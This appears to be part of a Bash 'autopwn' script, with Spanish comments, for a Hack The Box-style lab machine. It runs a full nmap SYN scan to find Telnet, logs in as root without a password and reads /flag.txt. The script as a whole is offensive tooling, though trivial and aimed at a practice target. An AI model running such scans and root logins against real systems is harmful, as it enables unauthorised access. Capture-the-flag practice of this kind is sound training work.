
# Escanear puertos
function scan_ports() {
    echo -e "${yellowColour}[*] Escaneando puertos abiertos con Nmap...${endColour}"
    nmap -p- --open -sS --min-rate 5000 -n -sCV -Pn "$IP" -oG "$NMAP_OUTPUT"
    TELNET_PORT=$(grep '/open/tcp//telnet' "$NMAP_OUTPUT" | awk '{print $1}' | cut -d'/' -f1)
    if [ -n "$TELNET_PORT" ]; then
        echo -e "${greenColour}[*] Puerto Telnet detectado: $TELNET_PORT${endColour}\n"
    else
        echo -e "${redColour}[!] No se detectó Telnet en la máquina. Abortando.${endColour}\n"
        exit 1
    fi
}

# Probar conexión Telnet
function test_telnet_connection() {
    echo -e "${yellowColour}[*] Probando conexión a Telnet...${endColour}"
    timeout 5 bash -c "echo > /dev/tcp/$IP/$TELNET_PORT" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${greenColour}[*] Conexión Telnet exitosa.${endColour}\n"
    else
        echo -e "${redColour}[!] No se pudo conectar a Telnet. Verifica la máquina objetivo.${endColour}\n"
        exit 1
    fi
}

# Capturar la flag
function capture_flag() {
    echo -e "${yellowColour}[*] Conectando a Telnet en $IP:$TELNET_PORT...${endColour}"
    (
        sleep 0.2  # Espera antes de iniciar sesión
        echo "root"  # Usuario a ingresar
        sleep 0.2  # Espera después del login
        echo "cat /flag.txt"  # Comando para capturar la flag
        sleep 0.2  # Espera después de capturar la flag
    ) | telnet "$IP" "$TELNET_PORT" > resultado_telnet.txt

    FLAG=$(grep -o "HTB{.*}" resultado_telnet.txt)
    if [ -n "$FLAG" ]; then
        echo -e "${greenColour}[*] Flag encontrada: $FLAG${endColour}\n"
    else
        echo -e "${redColour}[!] No se pudo capturar la flag.${endColour}\n"
    fi

    rm -f resultado_telnet.txt
}

# Inicio del script
if [ "$#" -ne 1 ]; then
    echo -e "${redColour}\n[!] Uso: $0 <direccion-ip>${endColour}"
    exit 1
fi

IP="$1"
TIMESTAMP=$(date +%s)
NMAP_OUTPUT="escaneoNmap_$TIMESTAMP"

detect_os
scan_ports
test_telnet_connection
capture_flag

echo -e "${blueColour}[*] Autopwn finalizado.${endColour}"
